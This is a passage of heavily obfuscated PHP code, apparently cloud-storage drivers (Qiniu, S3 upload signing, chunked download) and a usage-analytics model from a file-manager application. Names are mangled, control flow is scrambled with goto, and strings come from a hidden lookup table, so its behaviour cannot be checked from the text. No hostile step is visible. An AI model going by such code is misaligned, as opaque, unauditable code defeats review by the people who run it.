$E§ŒœÓ†Ôé) { $bùãé¶ƒ÷ê[] = $this->link($E§ŒœÓ†Ôé); } } else { $bùãé¶ƒ÷ê[] = $this->link($A·Ã–Õ§âè); } goto dˆÓ³¹¥õå; dˆÓ³¹¥õå: $A°¸é¥†ë» = new Qiniu\Cdn\CdnManager($this->auth); list($Eí£È½ÃÜ, $B½çŠÕğˆ) = $A°¸é¥†ë»->refreshUrls($bùãé¶ƒ÷ê); if ($B½çŠÕğˆ) { return !1; } goto a±‰ë¶ØĞË; e³¶‚àà‹: } public function fileSubstr($BÈŠˆ±, $cáÁ¡Ğ“£‹, $aÒó‹ªÁîÊ) { $E½½ÃÌë˜š =& $_SERVER[¢ÌÛ]; if (!($D½öãµÚòø = $this->link($BÈŠˆ±))) { return !1; } $CÒì—šÓ±Œ = !1; if ($aÒó‹ªÁîÊ > 0) { $A‰í‰ñËŒ§ = $cáÁ¡Ğ“£‹ + $aÒó‹ªÁîÊ - 1; $CÒì—šÓ±Œ = array($E½½ÃÌë˜š[1280] . $cáÁ¡Ğ“£‹ . $E½½ÃÌë˜š[438] . $A‰í‰ñËŒ§); } $açºÂì‘¶± = url_request($D½öãµÚòø, $E½½ÃÌë˜š[226], !1, $CÒì—šÓ±Œ); return $açºÂì‘¶±[$E½½ÃÌë˜š[712]] ? $açºÂì‘¶±[$E½½ÃÌë˜š[1064]] : !1; } public function upload($aŒÇ«ìøì›, $cºÒöÂÖ÷ , $CÏÔµŸ´’‰ = false, $aõˆß¤àÆ· = REPEAT_REPLACE) { $DÃ‹æŞïåà = new Qiniu\Storage\UploadManager(); $Bš•‰ ´¥º = $this->auth->uploadToken($this->bucket, $aŒÇ«ìøì›); $c¸ÏÄ¹© · = get_file_mime(get_path_ext($cºÒöÂÖ÷ )); list($dåÜçš¡†, $b±Òªï•‰) = $DÃ‹æŞïåà->putFile($Bš•‰ ´¥º, $aŒÇ«ìøì›, $cºÒöÂÖ÷ , null, $c¸ÏÄ¹© ·); return $b±Òªï•‰ ? !1 : $this->getPathOuter($aŒÇ«ìøì›); } public function uploadFormData($Aá•¹ğ‡á, $e²àÆÚ«Û = 3600) { return $this->uploadToken($Aá•¹ğ‡á, $e²àÆÚ«Û); } public function multiUploadFormData($a“Ûµ‡¤ÀÀ, $aÕíîÇí±Ä = 3600) { return $this->uploadToken($a“Ûµ‡¤ÀÀ, $aÕíîÇí±Ä); } private function uploadToken($A’‰ï‰Š, $c‘«­ÇæŸ = 3600) { goto bĞ®Ùï²; F²Œá‹Ÿß´: $a‡‚éÄ“î¸ = http_type() . "\x3a\x2f\57\165\160\154\x6f\x61\x64{$aé×¤º…­¿}\x2e\x71\x69\156\x69\x75\x70\x2e\143\157\x6d\57"; return array($fóºÕò™£ˆ[1284] => $A‘íÆ«Âö², $fóºÕò™£ˆ[1285] => $a‡‚éÄ“î¸); goto F¦£Òß•ùÅ; bĞ®Ùï²: $fóºÕò™£ˆ =& $_SERVER[¢ÌÛ]; $EæÃ‡–…Ğ = $c‘«­ÇæŸ; $c–¥Ó¡ˆ = array($fóºÕò™£ˆ[1281] => $fóºÕò™£ˆ[1282]); goto A‚ìœ¼à˜; A‚ìœ¼à˜: $BÓ©¥­±–‚ = $A’‰ï‰Š; $A‘íÆ«Âö² = $this->auth->uploadToken($this->bucket, $BÓ©¥­±–‚, $EæÃ‡–…Ğ, $c–¥Ó¡ˆ, !0); $aé×¤º…­¿ = empty($this->region) || $this->region == $fóºÕò™£ˆ[1283] ? $fóºÕò™£ˆ[33] : $fóºÕò™£ˆ[438] . $this->region; goto F²Œá‹Ÿß´; F¦£Òß•ùÅ: } public function download($cÅ‘²ÔÚ, $fÇ»Ä†íï²) { goto dŠç™İ¨ÕÓ; bÖ‘à˜Êª: $cˆÃñ—ÙÏÉ = 1024 * 200; $CíİËİ›Ç¾ = fopen($E½Ñ‘Õ´×¸, $_SERVER[¢ÌÛ][1286]); while (!0) { $DŞ÷£ö¹‚ = $this->fileSubstr($cÅ‘²ÔÚ, $BöŒ´’ŞÖ¨, $cˆÃñ—ÙÏÉ); if ($DŞ÷£ö¹‚ === !1) { return !1; } fwrite($CíİËİ›Ç¾, $DŞ÷£ö¹‚); $BöŒ´’ŞÖ¨ += $cˆÃñ—ÙÏÉ; if (strlen($DŞ÷£ö¹‚) < $cˆÃñ—ÙÏÉ) { break; } } goto aÏõ‡ßÄù½; dŠç™İ¨ÕÓ: $E½Ñ‘Õ´×¸ = IO::getPathInner(IO::mkfile($fÇ»Ä†íï²)); if (!($e÷Åø­öÙ÷ = $this->link($cÅ‘²ÔÚ))) { return !1; } $BöŒ´’ŞÖ¨ = 0; goto bÖ‘à˜Êª; aÏõ‡ßÄù½: fclose($CíİËİ›Ç¾); return $fÇ»Ä†íï²; goto Añõš«»İ; Añõš«»İ: } public function link($Cà‹«ëø, $f¹Ä¾”ß‚™ = '') { if (!$this->isFile($Cà‹«ëø)) { return !1; } $eºˆĞÄ¨´‡ = $this->getHost() . $_SERVER[¢ÌÛ][8] . $this->pathEncode($Cà‹«ëø) . $f¹Ä¾”ß‚™; return $this->auth->privateDownloadUrl($eºˆĞÄ¨´‡, 3600 * 12); } public function fileOut($F˜Ì£ƒÈ, $DÃï’¶§º— = false, $E”Œ‚¥ìŒˆ = false, $cÈ©ƒ¥Úİ£ = '') { $eåîëøÃ´¿ =& $_SERVER[¢ÌÛ]; if ($this->isFileOutServer()) { return $this->fileOutServer($F˜Ì£ƒÈ, $DÃï’¶§º—, $E”Œ‚¥ìŒˆ, $cÈ©ƒ¥Úİ£); } if (!$E”Œ‚¥ìŒˆ) { $E”Œ‚¥ìŒˆ = $this->pathThis($F˜Ì£ƒÈ); } $còÉ¬èÑ = $DÃï’¶§º— ? $eåîëøÃ´¿[1287] . rawurlencode($E”Œ‚¥ìŒˆ) : $eåîëøÃ´¿[33]; $aÀã•ÎÆ‰é = $this->link($F˜Ì£ƒÈ, $còÉ¬èÑ); $this->fileOutLink($aÀã•ÎÆ‰é); } public function fileOutServer($eÉêÌ„Ñ¡, $Eº’“ò²´Ş = false, $Cîİç¨®…¶ = false, $d×ï¡Ø³‡ = '') { parent::fileOut($eÉêÌ„Ñ¡, $Eº’“ò²´Ş, $Cîİç¨®…¶, $d×ï¡Ø³‡); } public function fileOutImage($dæ’ø›ùÔÄ, $A´ŸœÁ‰ì = 250) { $aÊ¹Ğ™ïÌ¡ = $this->link($dæ’ø›ùÔÄ, $_SERVER[¢ÌÛ][1288] . $A´ŸœÁ‰ì); $this->fileOutLink($aÊ¹Ğ™ïÌ¡); } public function fileOutImageServer($döò×ùÈ¯¥, $b÷¶Âí‹§ã = 250) { parent::fileOutImage($döò×ùÈ¯¥, $b÷¶Âí‹§ã); } public function hashMd5($cŞÊ¯¤öÃ÷) { $bî®ƒ†”‹Ä =& $_SERVER[¢ÌÛ]; $eğß• Š†õ = $this->objectMeta($cŞÊ¯¤öÃ÷); return isset($eğß• Š†õ[$bî®ƒ†”‹Ä[206]]) ? $eğß• Š†õ[$bî®ƒ†”‹Ä[206]] : !1; $FÒÜÂÎë«Ô = $this->link($cŞÊ¯¤öÃ÷, $bî®ƒ†”‹Ä[1289]); } public function size($B×šÉ§¡Ÿ) { $Aªœ’™ìÑù = $this->objectMeta($B×šÉ§¡Ÿ); return $Aªœ’™ìÑù ? $Aªœ’™ìÑù[$_SERVER[¢ÌÛ][77]] : 0; } public function info($C¾ÄØ¯Ê—Ì) { if ($this->isFolder($C¾ÄØ¯Ê—Ì)) { return $this->folderInfo($C¾ÄØ¯Ê—Ì); } else { if ($this->isFile($C¾ÄØ¯Ê—Ì)) { return $this->fileInfo($C¾ÄØ¯Ê—Ì); } } return !1; } public function exist($BŠœ£†²õÌ) { return $this->isFile($BŠœ£†²õÌ) || $this->isFolder($BŠœ£†²õÌ); } public function isFile($eÈ‰ß¨­À) { return !$this->isFolder($eÈ‰ß¨­À) && $this->objectMeta($eÈ‰ß¨­À); } public function isFolder($fî—Œ§®µÇ) { return $this->cacheMethod($_SERVER[¢ÌÛ][197], $fî—Œ§®µÇ); } protected function objectMeta($F¢ˆÌº´¬©) { return $this->cacheMethod($_SERVER[¢ÌÛ][198], $F¢ˆÌº´¬©); } protected function _objectMeta($b­ïÛè…Ñ) { $Cƒ×ãˆßØ =& $_SERVER[¢ÌÛ]; list($dˆ¦Ø‹Ùà, $C»Ñİİã¨) = $this->bucketManager->stat($this->bucket, $b­ïÛè…Ñ); if ($dˆ¦Ø‹Ùà) { $dˆ¦Ø‹Ùà[$Cƒ×ãˆßØ[77]] = intval($dˆ¦Ø‹Ùà[$Cƒ×ãˆßØ[1275]]); } return $dˆ¦Ø‹Ùà; } protected function _isFolder($bÇ ºÅéâ) { $BÓçÕ¶ˆéÏ =& $_SERVER[¢ÌÛ]; if ($bÇ ºÅéâ == $BÓçÕ¶ˆéÏ[33] || $bÇ ºÅéâ == $BÓçÕ¶ˆéÏ[8]) { return !0; } list($E³…†®é­, $a†—Íğ¡À·) = $this->bucketManager->listFiles($this->bucket, trim($bÇ ºÅéâ, $BÓçÕ¶ˆéÏ[8]) . $BÓçÕ¶ˆéÏ[8], $BÓçÕ¶ˆéÏ[33], 1, $BÓçÕ¶ˆéÏ[8]); return !empty($E³…†®é­[$BÓçÕ¶ˆéÏ[1278]]) || !empty($E³…†®é­[$BÓçÕ¶ˆéÏ[1279]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($D¥äŞ´åª—) { parent::__construct($D¥äŞ´åª—); } public function uploadFormData($F„»æ¼ìíƒ, $FùÎÌÎŸØÃ = 3600) { goto Bœ±åó‹‰Ä; f—Æ´åîËö: $eì»ğ±ì“ = array($B„ Æ¾‰™ö[209] => $B„ Æ¾‰™ö[33], $B„ Æ¾‰™ö[1207] => $B„ Æ¾‰™ö[33], $B„ Æ¾‰™ö[1165] => $Dì—õ¿­«, $B„ Æ¾‰™ö[1169] => $bÇààÌ‡½, $B„ Æ¾‰™ö[1173] => $BÇŒ¨Í¸‚â, $B„ Æ¾‰™ö[1208] => $d¢Ç×ù¸, $B„ Æ¾‰™ö[1209] => $cÒÌ­×œ°·, $B„ Æ¾‰™ö[1210] => $b‰Óíª¸£¨, $B„ Æ¾‰™ö[1211] => $f®–†°ËÙ, $B„ Æ¾‰™ö[1212] => $E…ù¯®Š‹, $B„ Æ¾‰™ö[175] => $this->getHost()); return $eì»ğ±ì“; goto dÌÍÏƒ®–†; A’ê‘çåÊ: $bè¢ÌæÙÒ = $B„ Æ¾‰™ö[1197]; $f®–†°ËÙ = $FùÎÌÎŸØÃ . $B„ Æ¾‰™ö[33]; $bÇààÌ‡½ = $B„ Æ¾‰™ö[1161]; goto FÇÅ±¸‰Öá; Bœ±åó‹‰Ä: $B„ Æ¾‰™ö =& $_SERVER[¢ÌÛ]; $Dì—õ¿­« = $B„ Æ¾‰™ö[191]; $cÒÌ­×œ°· = $B„ Æ¾‰™ö[1195]; goto cõ«›³ŸÀÛ; cõ«›³ŸÀÛ: $cåĞ¥é»÷Ş = $B„ Æ¾‰™ö[59]; $b‰Óíª¸£¨ = gmdate($B„ Æ¾‰™ö[1196]); $D®ÒĞÁ†íª = gmdate($B„ Æ¾‰™ö[713]); goto A’ê‘çåÊ; f·éî¾»ã: $BÇŒ¨Í¸‚â = base64_encode(json_encode($dÈš‡ğîÜµ)); $A–›¾…‘Ò‚ = hash_hmac($B„ Æ¾‰™ö[1205], $D®ÒĞÁ†íª, $B„ Æ¾‰™ö[1206] . $this->secret, !0); $e„ö¨òäôË = hash_hmac($B„ Æ¾‰™ö[1205], $this->region, $A–›¾…‘Ò‚, !0); goto cƒ‚»• ¶Ï; cƒ‚»• ¶Ï: $F¹Ø„¸èô = hash_hmac($B„ Æ¾‰™ö[1205], $cåĞ¥é»÷Ş, $e„ö¨òäôË, !0); $F½éƒîÅšÙ = hash_hmac($B„ Æ¾‰™ö[1205], $bè¢ÌæÙÒ, $F¹Ø„¸èô, !0); $E…ù¯®Š‹ = hash_hmac($B„ Æ¾‰™ö[1205], $BÇŒ¨Í¸‚â, $F½éƒîÅšÙ); goto f—Æ´åîËö; FÇÅ±¸‰Öá: $CÃÙÃ®“ùø = array($this->accessKey, $D®ÒĞÁ†íª, $this->region, $cåĞ¥é»÷Ş, $bè¢ÌæÙÒ); $d¢Ç×ù¸ = implode($B„ Æ¾‰™ö[8], $CÃÙÃ®“ùø); $dÈš‡ğîÜµ = array($B„ Æ¾‰™ö[1163] => gmdate($B„ Æ¾‰™ö[1162], strtotime($B„ Æ¾‰™ö[1198])), $B„ Æ¾‰™ö[1164] => array(array($B„ Æ¾‰™ö[1166] => $this->bucket), array($B„ Æ¾‰™ö[1165] => $Dì—õ¿­«), array($B„ Æ¾‰™ö[1167], $B„ Æ¾‰™ö[1168], $B„ Æ¾‰™ö[33]), array($B„ Æ¾‰™ö[1167], $B„ Æ¾‰™ö[1199], $B„ Æ¾‰™ö[33]), array($B„ Æ¾‰™ö[1167], $B„ Æ¾‰™ö[1200], $B„ Æ¾‰™ö[33]), array($B„ Æ¾‰™ö[1169] => $bÇààÌ‡½), array($B„ Æ¾‰™ö[1201] => $d¢Ç×ù¸), array($B„ Æ¾‰™ö[1202] => $cÒÌ­×œ°·), array($B„ Æ¾‰™ö[1203] => $b‰Óíª¸£¨), array($B„ Æ¾‰™ö[1204] => $f®–†°ËÙ))); goto f·éî¾»ã; dÌÍÏƒ®–†: } public function multiUploadFormData($AÖ¶ì½˜Š, $d°¯áÚéŒÂ = 3600) { $bƒ¯ù–È“ğ =& $_SERVER[¢ÌÛ]; $D–±ÌØÒÏœ = gmdate($bƒ¯ù–È“ğ[1290]); $E‹ô¤¬  = array(); $F‡¦ª÷¤ = $this->client->getUploadId($this->bucket, $AÖ¶ì½˜Š, $E‹ô¤¬ ); if (!$F‡¦ª÷¤) { return !1; } return array($bƒ¯ù–È“ğ[219] => $F‡¦ª÷¤, $bƒ¯ù–È“ğ[175] => $this->getHost() . $bƒ¯ù–È“ğ[8] . $this->pathEncode($AÖ¶ì½˜Š), $bƒ¯ù–È“ğ[220] => $D–±ÌØÒÏœ, $bƒ¯ù–È“ğ[92] => $AÖ¶ì½˜Š); } public function multiUploadAuthData($FÑ°Î–Â¸í, $cŒ‡²ÒÅÃ½ = array()) { goto F¸®³Ñ ›”; CÈÅ¬ÛÁ‰: if (isset($cŒ‡²ÒÅÃ½[$CÚòŞ„§Ï×[1291]])) { $FôËİÍ¶Ö[$CÚòŞ„§Ï×[1292]] = $cŒ‡²ÒÅÃ½[$CÚòŞ„§Ï×[1291]]; } $DÌ¡Ú‰‡ğĞ = explode($CÚòŞ„§Ï×[177], $this->getHost()); $f³ÇÄõ¢ôù = array($CÚòŞ„§Ï×[1293] => $DÌ¡Ú‰‡ğĞ[1], $CÚòŞ„§Ï×[1294] => $CÚòŞ„§Ï×[33], $CÚòŞ„§Ï×[209] => $CÚòŞ„§Ï×[118], $CÚòŞ„§Ï×[1207] => $cŒ‡²ÒÅÃ½[$CÚòŞ„§Ï×[77]]); goto EÃŸš¤„ ; F¸®³Ñ ›”: $CÚòŞ„§Ï× =& $_SERVER[¢ÌÛ]; $fÄ†ËœŠë½ = isset($cŒ‡²ÒÅÃ½[$CÚòŞ„§Ï×[167]]) ? $cŒ‡²ÒÅÃ½[$CÚòŞ„§Ï×[167]] : $CÚòŞ„§Ï×[33]; $fÖÀÂ¦¨ÕØ = $cŒ‡²ÒÅÃ½[$CÚòŞ„§Ï×[92]]; goto FÉÌŠ·Â¯–; EÃŸš¤„ : $f’Ã —®Êš = $CÚòŞ„§Ï×[224]; $e…ò•Ø–í£ = $CÚòŞ„§Ï×[8] . $this->pathEncode($fÖÀÂ¦¨ÕØ) . $fÄ†ËœŠë½; $dŠÎ­‹‰È½ = $this->client->__getSignatureV4($FôËİÍ¶Ö, $f³ÇÄõ¢ôù, $f’Ã —®Êš, $e…ò•Ø–í£); goto D¢µô¨¶ÚŒ; D¢µô¨¶ÚŒ: if (strpos($fÄ†ËœŠë½, $CÚòŞ„§Ï×[223]) === 0) { if (isset($FôËİÍ¶Ö[$CÚòŞ„§Ï×[1292]])) { $aÀèĞ”ñÈ = $FôËİÍ¶Ö[$CÚòŞ„§Ï×[1292]]; } else { if (isset($dŠÎ­‹‰È½[$CÚòŞ„§Ï×[1292]])) { $aÀèĞ”ñÈ = $dŠÎ­‹‰È½[$CÚòŞ„§Ï×[1292]]; } else { $aÀèĞ”ñÈ = hash($CÚòŞ„§Ï×[1205], $CÚòŞ„§Ï×[33]); } } return array($CÚòŞ„§Ï×[230] => $dŠÎ­‹‰È½[$CÚòŞ„§Ï×[230]], $CÚòŞ„§Ï×[1292] => $aÀèĞ”ñÈ, $CÚòŞ„§Ï×[220] => $dŠÎ­‹‰È½[$CÚòŞ„§Ï×[1295]]); } return $dŠÎ­‹‰È½[$CÚòŞ„§Ï×[230]]; goto c†¼ä¬öéš; FÉÌŠ·Â¯–: unset($cŒ‡²ÒÅÃ½[$CÚòŞ„§Ï×[92]]); if (isset($cŒ‡²ÒÅÃ½[$CÚòŞ„§Ï×[221]])) { return $this->listUploadParts($fÖÀÂ¦¨ÕØ, $cŒ‡²ÒÅÃ½); } $FôËİÍ¶Ö = array(); goto CÈÅ¬ÛÁ‰; c†¼ä¬öéš: } public function listUploadParts($F¼·Î¯¦–‘, $D¯ÂË¥å‰£ = array()) { goto A˜Î‚ÎŒ; EÖè ¼Ü¼º: if (!$aöàîÕÈŒÑ) { return !1; } $FœÓÉæ‚Ü– = $C†–§¿Œ·¸[1296]; foreach ($aöàîÕÈŒÑ as $cÅ‚îÌÏˆÎ) { $FœÓÉæ‚Ü– .= $C†–§¿Œ·¸[1297] . "\x3c\120\x61\x72\164\116\x75\x6d\x62\145\162\76{$cÅ‚îÌÏˆÎ[$C†–§¿Œ·¸[1252]]}\74\x2f\120\x61\x72\164\116\x75\155\142\x65\x72\x3e\xa" . "\x3c\x45\x54\141\147\76{$cÅ‚îÌÏˆÎ[$C†–§¿Œ·¸[1253]]}\74\x2f\x45\x54\141\147\x3e\xa" . $C†–§¿Œ·¸[1298]; } goto aÂš Òš›±; aÂš Òš›±: $FœÓÉæ‚Ü– .= $C†–§¿Œ·¸[1299]; $b¿íÄ¡à˜Î = array(); $e“½†ôÛ = explode($C†–§¿Œ·¸[177], $this->getHost()); goto f£™ÇĞÕ–ç; BÕ¶Æêóßõ: $AÙªç¶¶Ø = $this->client->__getSignatureV4($b¿íÄ¡à˜Î, $fÆª¤·§¡ë, $d÷ÆäÃÛ«, $Aã¥íÚ—Äœ, $FœÓÉæ‚Ü–); return array($C†–§¿Œ·¸[230] => $AÙªç¶¶Ø[$C†–§¿Œ·¸[230]], $C†–§¿Œ·¸[220] => $AÙªç¶¶Ø[$C†–§¿Œ·¸[1295]], $C†–§¿Œ·¸[232] => $aöàîÕÈŒÑ, $C†–§¿Œ·¸[1292] => $AÙªç¶¶Ø[$C†–§¿Œ·¸[1292]]); goto DŒ‡ŸùÍŠ; A˜Î‚ÎŒ: $C†–§¿Œ·¸ =& $_SERVER[¢ÌÛ]; $D×Ñî°´Ç = str_replace($C†–§¿Œ·¸[231], $C†–§¿Œ·¸[33], $D¯ÂË¥å‰£[$C†–§¿Œ·¸[167]]); $aöàîÕÈŒÑ = $this->client->listParts($this->bucket, $F¼·Î¯¦–‘, $D×Ñî°´Ç); goto EÖè ¼Ü¼º; f£™ÇĞÕ–ç: $fÆª¤·§¡ë = array($C†–§¿Œ·¸[1293] => $e“½†ôÛ[1], $C†–§¿Œ·¸[209] => $C†–§¿Œ·¸[118], $C†–§¿Œ·¸[1207] => strlen($FœÓÉæ‚Ü–)); $d÷ÆäÃÛ« = $C†–§¿Œ·¸[222]; $Aã¥íÚ—Äœ = $C†–§¿Œ·¸[8] . $this->pathEncode($F¼·Î¯¦–‘) . $D¯ÂË¥å‰£[$C†–§¿Œ·¸[167]]; goto BÕ¶Æêóßõ; DŒ‡ŸùÍŠ: } public function link($f¸ª„£ˆÎØ, $a‰Æ·‰²ö = array()) { return parent::link($f¸ª„£ˆÎØ, $a‰Æ·‰²ö); } public function fileOut($d…Ş«ƒã¼Ã, $cí‘äÛ”Ä‰ = false, $aÓïğ÷Ûª = false, $aî¹Ø˜» = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¢ÌÛ][1300])) { return parent::fileOutServer($d…Ş«ƒã¼Ã, $cí‘äÛ”Ä‰, $aÓïğ÷Ûª, $aî¹Ø˜»); } parent::fileOut($d…Ş«ƒã¼Ã, $cí‘äÛ”Ä‰, $aÓïğ÷Ûª, $aî¹Ø˜»); } public function fileOutImage($Dµ‹‹Ğ‹—ó, $E£—÷ƒÊÍ– = 250) { if (strstr($this->endpoint, $_SERVER[¢ÌÛ][1300])) { return parent::fileOutImageServer($Dµ‹‹Ğ‹—ó, $E£—÷ƒÊÍ–); } parent::fileOutImage($Dµ‹‹Ğ‹—ó, $E£—÷ƒÊÍ–); } public function fileOutLink($b¡Å©äîÓà) { $a±­Ş³£† =& $_SERVER[¢ÌÛ]; if (substr($b¡Å©äîÓà, 0, 7) == $a±­Ş³£†[1176]) { $b¡Å©äîÓà = $a±­Ş³£†[1177] . substr($b¡Å©äîÓà, 7); } header($a±­Ş³£†[158] . $b¡Å©äîÓà); die; } public function getHost() { $açÕÄøŠÁ =& $_SERVER[¢ÌÛ]; $e±à©ø¤Ç = str_rtrim(parent::getHost(), $açÕÄøŠÁ[8] . $this->bucket); $e±à©ø¤Ç = explode($açÕÄøŠÁ[177], $e±à©ø¤Ç); return $e±à©ø¤Ç[0] . $açÕÄøŠÁ[177] . $this->bucket . $açÕÄøŠÁ[94] . $e±à©ø¤Ç[1]; } } goto E“Í¤ÛäÓ; E†°Ï¤¿ğä: class AnalysisModel extends ModelBaseLight { public function init($EÇôçâ¹è·) { $E»ÔñŠâÒ× =& $_SERVER[¢ÌÛ]; $d´î²ß¸è = array($E»ÔñŠâÒ×[560] => array($E»ÔñŠâÒ×[29] => $E»ÔñŠâÒ×[1582], $E»ÔñŠâÒ×[269] => array($E»ÔñŠâÒ×[220], $E»ÔñŠâÒ×[723], $E»ÔñŠâÒ×[1583], $E»ÔñŠâÒ×[1584])), $E»ÔñŠâÒ×[1585] => array($E»ÔñŠâÒ×[29] => $E»ÔñŠâÒ×[1586], $E»ÔñŠâÒ×[269] => array($E»ÔñŠâÒ×[220], $E»ÔñŠâÒ×[721], $E»ÔñŠâÒ×[1587], $E»ÔñŠâÒ×[1588], $E»ÔñŠâÒ×[1589]))); if (!isset($d´î²ß¸è[$EÇôçâ¹è·])) { return !1; } $this->optionType = $d´î²ß¸è[$EÇôçâ¹è·][$E»ÔñŠâÒ×[29]]; $this->field = $d´î²ß¸è[$EÇôçâ¹è·][$E»ÔñŠâÒ×[269]]; return !0; } public function listData($dèŠä“¶Ì² = false, $féÕğÅª = "\155\x6f\x64\151\x66\x79\x54\x69\155\145", $a“´ê‚÷á­ = false) { return parent::listData($dèŠä“¶Ì², $féÕğÅª, $a“´ê‚÷á­); } public function trendList($FØÚ‰¹ÓÖ·) { goto f•³ìòÕ; cÆºîÏğ¬ç: foreach ($a×ßÇ÷×º‡ as $eğ­ÔŒéŒ½) { $this->{$E˜‚‡Œ«ˆ¾}($eğ­ÔŒéŒ½); } return $this->listData(); goto fÅ¬õõíô’; E¼âŠ»µ: if (!isset($aç÷Œ“¯‡”)) { $D±ìÉäË×Ã = $FØÚ‰¹ÓÖ· == $f¢ù¢Å¦ñ[560] ? $f¢ù¢Å¦ñ[504] : $f¢ù¢Å¦ñ[774]; $aç÷Œ“¯‡” = Model($D±ìÉäË×Ã)->min($f¢ù¢Å¦ñ[192]); } $E˜‚‡Œ«ˆ¾ = $f¢ù¢Å¦ñ[1592] . ucfirst($FØÚ‰¹ÓÖ·); $a×ßÇ÷×º‡ = $this->dateList($aç÷Œ“¯‡”); goto cÆºîÏğ¬ç; f•³ìòÕ: $f¢ù¢Å¦ñ =& $_SERVER[¢ÌÛ]; $F§‰ãÆ¤îÑ = $this->listData(); if ($F§‰ãÆ¤îÑ) { $dî†¿èÁ¯é = end($F§‰ãÆ¤îÑ); $eğ­ÔŒéŒ½ = date($f¢ù¢Å¦ñ[1590], strtotime($f¢ù¢Å¦ñ[1591])); if ($dî†¿èÁ¯é[$f¢ù¢Å¦ñ[220]] == $eğ­ÔŒéŒ½) { return $F§‰ãÆ¤îÑ; } $aç÷Œ“¯‡” = strtotime($dî†¿èÁ¯é[$f¢ù¢Å¦ñ[220]]); } goto E¼âŠ»µ; fÅ¬õõíô’: } private function dateList($a÷ŞŸî¹¯¯) { $C–ĞÆ©îÚ¤ =& $_SERVER[¢ÌÛ]; $eµ‡îñŸ°ô = $a÷ŞŸî¹¯¯; $D¦í÷Ğ Ñ = strtotime($C–ĞÆ©îÚ¤[1591]); $d×§à¿–ˆÊ = array(); while ($eµ‡îñŸ°ô <= $D¦í÷Ğ Ñ) { $d×§à¿–ˆÊ[] = date($C–ĞÆ©îÚ¤[1590], $eµ‡îñŸ°ô); $eµ‡îñŸ°ô = strtotime($C–ĞÆ©îÚ¤[1593], $eµ‡îñŸ°ô); } return $d×§à¿–ˆÊ; } public function _recordUser($b¹ö‰åĞÎ = '') { goto EÜêïòöÌÊ; C«æô—ö : $b«¦²¥Ø©Ú = array($fç´™§‚Î’[192] => array($fç´™§‚Î’[947], $cÜµÁŸëœÒ)); $C¶ÊßçÆÇ‡ = Model($fç´™§‚Î’[504])->where($b«¦²¥Ø©Ú)->count($fç´™§‚Î’[1498]); $b«¦²¥Ø©Ú[$fç´™§‚Î’[192]] = array($fç´™§‚Î’[329], array($bÒƒïâ‘, $cÜµÁŸëœÒ)); goto BİŒŠ˜’Á; EÜêïòöÌÊ: $fç´™§‚Î’ =& $_SERVER[¢ÌÛ]; $bÒƒïâ‘ = strtotime(date($fç´™§‚Î’[1594], strtotime($b¹ö‰åĞÎ))); $cÜµÁŸëœÒ = strtotime(date($fç´™§‚Î’[1595], strtotime($b¹ö‰åĞÎ))); goto C«æô—ö ; BİŒŠ˜’Á: $f‚ê—à°÷ç = Model($fç´™§‚Î’[504])->where($b«¦²¥Ø©Ú)->count($fç´™§‚Î’[1498]); $b«¦²¥Ø©Ú[$fç´™§‚Î’[29]] = $fç´™§‚Î’[1596]; $b‹ŒâîÍê = Model($fç´™§‚Î’[1597])->where($b«¦²¥Ø©Ú)->count($fç´™§‚Î’[1598]); goto cßŒ¼»†Õ‘; cßŒ¼»†Õ‘: $a¢¸ªÎ“ô = array($fç´™§‚Î’[220] => $b¹ö‰åĞÎ, $fç´™§‚Î’[723] => (int) $C¶ÊßçÆÇ‡, $fç´™§‚Î’[1583] => (int) $f‚ê—à°÷ç, $fç´™§‚Î’[1584] => (int) $b‹ŒâîÍê); return $this->insert($a¢¸ªÎ“ô); goto E¨­ç§áìÒ; E¨­ç§áìÒ: } public function _recordStore($DÇ¥¹æ©ø“ = '') { goto DËãë­Ş×‚; aÃ’Ğ‹ĞÚ: $BÀ‰‘÷†ÜÖ[$b©ÕÏ®¨‡…[398]] = 1; $bÑÒíÇÔ¶ƒ = Model($b©ÕÏ®¨‡…[774])->where($BÀ‰‘÷†ÜÖ)->sum($b©ÕÏ®¨‡…[77]); $BÀ‰‘÷†ÜÖ[$b©ÕÏ®¨‡…[398]] = 2; goto Cƒò£ƒˆˆ; Ešëš¶™: $CÛÕÏÂøƒ = Model($b©ÕÏ®¨‡…[448])->where($BÀ‰‘÷†ÜÖ)->sum($b©ÕÏ®¨‡…[77]); $BÀ‰‘÷†ÜÖ[$b©ÕÏ®¨‡…[397]] = 0; $b„ïœ’˜İ = Model($b©ÕÏ®¨‡…[774])->where($BÀ‰‘÷†ÜÖ)->sum($b©ÕÏ®¨‡…[77]); goto aÃ’Ğ‹ĞÚ; DËãë­Ş×‚: $b©ÕÏ®¨‡… =& $_SERVER[¢ÌÛ]; $aÜÛÀÉ‹‘ç = strtotime(date($b©ÕÏ®¨‡…[1595], strtotime($DÇ¥¹æ©ø“))); $BÀ‰‘÷†ÜÖ = array($b©ÕÏ®¨‡…[192] => array($b©ÕÏ®¨‡…[947], $aÜÛÀÉ‹‘ç)); goto Ešëš¶™; Cƒò£ƒˆˆ: $f¡Í»¥ÓÇ = Model($b©ÕÏ®¨‡…[774])->where($BÀ‰‘÷†ÜÖ)->sum($b©ÕÏ®¨‡…[77]); $A…÷À† = array($b©ÕÏ®¨‡…[220] => $DÇ¥¹æ©ø“, $b©ÕÏ®¨‡…[721] => (int) $b„ïœ’˜İ, $b©ÕÏ®¨‡…[1587] => (int) $CÛÕÏÂøƒ, $b©ÕÏ®¨‡…[1588] => (int) $bÑÒíÇÔ¶ƒ, $b©ÕÏ®¨‡…[1589] => (int) $f¡Í»¥ÓÇ); return $this->insert($A…÷À†); goto F¸™ô­¯; F¸™ô­¯: } public function trend($A¡Óùñßä‡, $CßªÛµ–©) { goto Bëéì¯ÍÖ; eİ‰Á‡îÂÛ: return $bÒÊª‡š–İ; goto Bì¹ÁÓÎ‹Î; Bëéì¯ÍÖ: $Eñ°Øëƒò· =& $_SERVER[¢ÌÛ]; if (!$this->init($A¡Óùñßä‡)) { return !1; } $fÆÜ‹çÎ–ì = $this->trendList($A¡Óùñßä‡); goto D¡ÎªÆÅ‘; D¡ÎªÆÅ‘: if ($fÆÜ‹çÎ–ì && $CßªÛµ–© != $Eñ°Øëƒò·[1472]) { $F¦¯åÙ»èÅ = $fÆÜ‹çÎ–ì[0][$Eñ°Øëƒò·[220]]; $eÍ‡™Õèä = $this->validDate($CßªÛµ–©, $F¦¯åÙ»èÅ); $C°–í—ƒæ = array(); $cÅù©×ŸÂ” = 